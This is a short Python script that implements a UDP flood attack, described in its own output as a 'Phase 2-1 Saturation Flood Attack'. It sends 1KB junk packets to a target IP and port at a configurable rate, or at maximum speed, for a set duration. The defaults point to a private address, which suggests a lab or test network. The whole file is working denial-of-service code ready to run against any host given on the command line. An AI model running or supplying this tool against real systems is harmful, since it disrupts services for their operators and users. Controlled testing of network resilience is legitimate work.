#!/usr/bin/env python3
import socket
import time
import argparse

def flood(target_ip, port, duration, rate):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"NOISE" * 200 # 1KB of noise
    end_time = time.time() + duration
    
    print(f"[*] Starting Phase 2-1 Flood Attack against {target_ip}:{port}")
    print(f"[*] Duration: {duration}s, Target Rate: ~{rate} pkts/sec")
    
    sent = 0
    sleep_interval = 1.0 / rate if rate > 0 else 0
    
    while time.time() < end_time:
        sock.sendto(payload, (target_ip, port))
        sent += 1
        if sleep_interval > 0:
            time.sleep(sleep_interval)
            
    print(f"[+] Attack finished. Sent {sent} packets.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Phase 2-1 Saturation Flood Attack")
    parser.add_argument("--ip", default="192.168.151.20", help="Target IP")
    parser.add_argument("--port", type=int, default=20000, help="Target Port")
    parser.add_argument("--duration", type=int, default=10, help="Duration in seconds")
    parser.add_argument("--rate", type=int, default=10000, help="Packets per second (0 for max)")
    args = parser.parse_args()
    
    flood(args.ip, args.port, args.duration, args.rate)
